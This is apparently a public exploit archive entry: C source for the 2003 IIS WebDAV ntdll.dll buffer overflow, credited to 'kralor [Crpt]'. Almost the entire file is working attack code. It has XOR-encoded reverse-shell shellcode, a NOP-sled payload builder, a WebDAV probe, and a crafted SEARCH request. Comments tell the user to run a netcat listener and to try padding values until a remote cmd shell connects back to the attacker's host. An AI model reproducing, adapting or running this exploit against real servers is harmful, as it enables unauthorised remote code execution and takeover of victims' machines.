/*******************************************************************/
/* [Crpt] ntdll.dll exploit trough WebDAV by kralor [Crpt] */
/* --------------------------------------------------------------- */
/* this is the exploit for ntdll.dll through WebDAV. */
/* run a netcat ex: nc -L -vv -p 666 */
/* wb server.com your_ip 666 0 */
/* the shellcode is a reverse remote shell */
/* you need to pad a bit.. the best way I think is launching */
/* the exploit with pad = 0 and after that, the server will be */
/* down for a couple of seconds, now retry with pad at 1 */
/* and so on..pad 2.. pad 3.. if you haven&#039;t the shell after */
/* something like pad at 10 I think you better to restart from */
/* pad at 0. On my local IIS the pad was at 1 (0x00110011) but */
/* on all the others servers it was at 2,3,4, etc..sometimes */
/* you can have the force with you, and get the shell in 1 try */
/* sometimes you need to pad more than 10 times ;) */
/* the shellcode was coded by myself, it is SEH + ScanMem to */
/* find the famous offsets (GetProcAddress).. */
/* */
/*******************************************************************/


#include &lt;winsock.h&gt;
#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;

#pragma comment (lib,&quot;ws2_32&quot;)

char shellc0de[] =
&quot;\x55\x8b\xec\x33\xc9\x53\x56\x57\x8d\x7d\xa2\xb1\x25\xb8\xcc\xcc&quot;
&quot;\xcc\xcc\xf3\xab\xeb\x09\xeb\x0c\x58\x5b\x59\x5a\x5c\x5d\xc3\xe8&quot;
&quot;\xf2\xff\xff\xff\x5b\x80\xc3\x10\x33\xc9\x66\xb9\xb5\x01\x80\x33&quot;
&quot;\x95\x43\xe2\xfa\x66\x83\xeb\x67\xfc\x8b\xcb\x8b\xf3\x66\x83\xc6&quot;
&quot;\x46\xad\x56\x40\x74\x16\x55\xe8\x13\x00\x00\x00\x8b\x64\x24\x08&quot;
&quot;\x64\x8f\x05\x00\x00\x00\x00\x58\x5d\x5e\xeb\xe5\x58\xeb\xb9\x64&quot;
&quot;\xff\x35\x00\x00\x00\x00\x64\x89\x25\x00\x00\x00\x00\x48\x66\x81&quot;
&quot;\x38\x4d\x5a\x75\xdb\x64\x8f\x05\x00\x00\x00\x00\x5d\x5e\x8b\xe8&quot;
&quot;\x03\x40\x3c\x8b\x78\x78\x03\xfd\x8b\x77\x20\x03\xf5\x33\xd2\x8b&quot;
&quot;\x06\x03\xc5\x81\x38\x47\x65\x74\x50\x75\x25\x81\x78\x04\x72\x6f&quot;
&quot;\x63\x41\x75\x1c\x81\x78\x08\x64\x64\x72\x65\x75\x13\x8b\x47\x24&quot;
&quot;\x03\xc5\x0f\xb7\x1c\x50\x8b\x47\x1c\x03\xc5\x8b\x1c\x98\x03\xdd&quot;
&quot;\x83\xc6\x04\x42\x3b\x57\x18\x75\xc6\x8b\xf1\x56\x55\xff\xd3\x83&quot;
&quot;\xc6\x0f\x89\x44\x24\x20\x56\x55\xff\xd3\x8b\xec\x81\xec\x94\x00&quot;
&quot;\x00\x00\x83\xc6\x0d\x56\xff\xd0\x89\x85\x7c\xff\xff\xff\x89\x9d&quot;
&quot;\x78\xff\xff\xff\x83\xc6\x0b\x56\x50\xff\xd3\x33\xc9\x51\x51\x51&quot;
&quot;\x51\x41\x51\x41\x51\xff\xd0\x89\x85\x94\x00\x00\x00\x8b\x85\x7c&quot;
&quot;\xff\xff\xff\x83\xc6\x0b\x56\x50\xff\xd3\x83\xc6\x08\x6a\x10\x56&quot;
&quot;\x8b\x8d\x94\x00\x00\x00\x51\xff\xd0\x33\xdb\xc7\x45\x8c\x44\x00&quot;
&quot;\x00\x00\x89\x5d\x90\x89\x5d\x94\x89\x5d\x98\x89\x5d\x9c\x89\x5d&quot;
&quot;\xa0\x89\x5d\xa4\x89\x5d\xa8\xc7\x45\xb8\x01\x01\x00\x00\x89\x5d&quot;
&quot;\xbc\x89\x5d\xc0\x8b\x9d\x94\x00\x00\x00\x89\x5d\xc4\x89\x5d\xc8&quot;
&quot;\x89\x5d\xcc\x8d\x45\xd0\x50\x8d\x4d\x8c\x51\x6a\x00\x6a\x00\x6a&quot;
&quot;\x00\x6a\x01\x6a\x00\x6a\x00\x83\xc6\x09\x56\x6a\x00\x8b\x45\x20&quot;
&quot;\xff\xd0&quot;
&quot;CreateProcessA\x00LoadLibraryA\x00ws2_32.dll\x00WSASocketA\x00&quot;
&quot;connect\x00\x02\x00\x02\x9A\xC0\xA8\x01\x01\x00&quot;
&quot;cmd&quot; // don&#039;t change anything..
&quot;\x00\x00\xe7\x77&quot; // offsets of kernel32.dll for some win ver..
&quot;\x00\x00\xe8\x77&quot;
&quot;\x00\x00\xf0\x77&quot;
&quot;\x00\x00\xe4\x77&quot;
&quot;\x00\x88\x3e\x04&quot; // win2k3
&quot;\x00\x00\xf7\xbf&quot; // win9x =P
&quot;\xff\xff\xff\xff&quot;;

int test_host(char *host)
{
char search[100]=&quot;&quot;;
int sock;
struct hostent *heh;
struct sockaddr_in hmm;
char buf[100] =&quot;&quot;;

if(strlen(host)&gt;60) {
printf(&quot;error: victim host too long.\r\n&quot;);
return 1;
}

if ((heh = gethostbyname(host))==0){
printf(&quot;error: can&#039;t resolve &#039;%s&#039;&quot;,host);
return 1;
}

sprintf(search,&quot;SEARCH / HTTP/1.1\r\nHost: %s\r\n\r\n&quot;,host);
hmm.sin_port = htons(80);
hmm.sin_family = AF_INET;
hmm.sin_addr = *((struct in_addr *)heh-&gt;h_addr);

if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1){
printf(&quot;error: can&#039;t create socket&quot;);
return 1;
}

printf(&quot;Checking WebDav on &#039;%s&#039; ... &quot;,host);

if ((connect(sock, (struct sockaddr *) &amp;hmm, sizeof(hmm))) == -1){
printf(&quot;CONNECTING_ERROR\r\n&quot;);
return 1;
}
send(sock,search,strlen(search),0);
recv(sock,buf,sizeof(buf),0);
if(buf[9]==&#039;4&#039;&amp;&amp;buf[10]==&#039;1&#039;&amp;&amp;buf[11]==&#039;1&#039;)
return 0;
printf(&quot;NOT FOUND\r\n&quot;);
return 1;
}

void help(char *program)
{
printf(&quot;syntax: %s &lt;victim_host&gt; &lt;your_host&gt; &lt;your_port&gt; [padding]\r\n&quot;,program);
return;
}

void banner(void)
{
printf(&quot;\r\n\t [Crpt] ntdll.dll exploit trough WebDAV by kralor
[Crpt]\r\n&quot;);
printf(&quot;\t\twww.coromputer.net &amp;&amp; undernet #coromputer\r\n\r\n&quot;);
return;
}

void main(int argc, char *argv[])
{
WSADATA wsaData;
unsigned short port=0;
char *port_to_shell=&quot;&quot;, *ip1=&quot;&quot;, data[50]=&quot;&quot;;
unsigned int i,j;
unsigned int ip = 0 ;
int s, PAD=0x10;
struct hostent *he;
struct sockaddr_in crpt;
char buffer[65536] =&quot;&quot;;
char request[80000]; // huuuh, what a mess! :)
char content[] =
&quot;&lt;?xml version=\&quot;1.0\&quot;?&gt;\r\n&quot;
&quot;&lt;g:searchrequest xmlns:g=\&quot;DAV:\&quot;&gt;\r\n&quot;
&quot;&lt;g:sql&gt;\r\n&quot;
&quot;Select \&quot;DAV:displayname\&quot; from scope()\r\n&quot;
&quot;&lt;/g:sql&gt;\r\n&quot;
&quot;&lt;/g:searchrequest&gt;\r\n&quot;;

banner();
if((argc&lt;4)||(argc&gt;5)) {
help(argv[0]);
return;
}

if(WSAStartup(0x0101,&amp;wsaData)!=0) {
printf(&quot;error starting winsock..&quot;);
return;
}

if(test_host(argv[1]))
return;

if(argc==5)
PAD+=atoi(argv[4]);

printf(&quot;FOUND\r\nexploiting ntdll.dll through WebDav [ret: 0x00%02x00%02x]\r\n&quot;,PAD,PAD);

ip = inet_addr(argv[2]); ip1 = (char*)&amp;ip;

shellc0de[448]=ip1[0]; shellc0de[449]=ip1[1]; shellc0de[450]=ip1[2];
shellc0de[451]=ip1[3];

port = htons(atoi(argv[3]));
port_to_shell = (char *) &amp;port;
shellc0de[446]=port_to_shell[0];
shellc0de[447]=port_to_shell[1];

// we xor the shellcode [xored by 0x95 to avoid bad chars]
__asm {
lea eax, shellc0de
add eax, 0x34
xor ecx, ecx
mov cx, 0x1b0
wah:
xor byte ptr[eax], 0x95
inc eax
loop wah
}

if ((he = gethostbyname(argv[1]))==0){
printf(&quot;error: can&#039;t resolve &#039;%s&#039;&quot;,argv[1]);
return;
}

crpt.sin_port = htons(80);
crpt.sin_family = AF_INET;
crpt.sin_addr = *((struct in_addr *)he-&gt;h_addr);

if ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1){
printf(&quot;error: can&#039;t create socket&quot;);
return;
}

printf(&quot;Connecting... &quot;);

if ((connect(s, (struct sockaddr *) &amp;crpt, sizeof(crpt))) == -1){
printf(&quot;ERROR\r\n&quot;);
return;
}
// No Operation.
for(i=0;i&lt;sizeof(buffer);buffer[i]=(char)0x90,i++);
// fill the buffer with the shellcode
for(i=64000,j=0;i&lt;sizeof(buffer)&amp;&amp;j&lt;sizeof(shellc0de)-1;buffer[i]=shellc0de[j],i++,j++);
// well..it is not necessary..
for(i=0;i&lt;2500;buffer[i]=PAD,i++);

/* we can simply put our ret in this 2 offsets.. */
//buffer[2086]=PAD;
//buffer[2085]=PAD;

buffer[sizeof(buffer)]=0x00;
memset(request,0,sizeof(request));
memset(data,0,sizeof(data));
sprintf(request,&quot;SEARCH /%s HTTP/1.1\r\nHost: %s\r\nContent-type: text/xml\r\nContent-Length: &quot;,buffer,argv[1]);
sprintf(request,&quot;%s%d\r\n\r\n&quot;,request,strlen(content));
printf(&quot;CONNECTED\r\nSending evil request... &quot;);
send(s,request,strlen(request),0);
send(s,content,strlen(content),0);
printf(&quot;SENT\r\n&quot;);
recv(s,data,sizeof(data),0);
if(data[0]!=0x00) {
printf(&quot;Server seems to be patched.\r\n&quot;);
printf(&quot;data: %s\r\n&quot;,data);
} else
printf(&quot;Now if you are lucky you will get a shell.\r\n&quot;);
closesocket(s);
return;
}

// milw0rm.com [2003-03-23]
            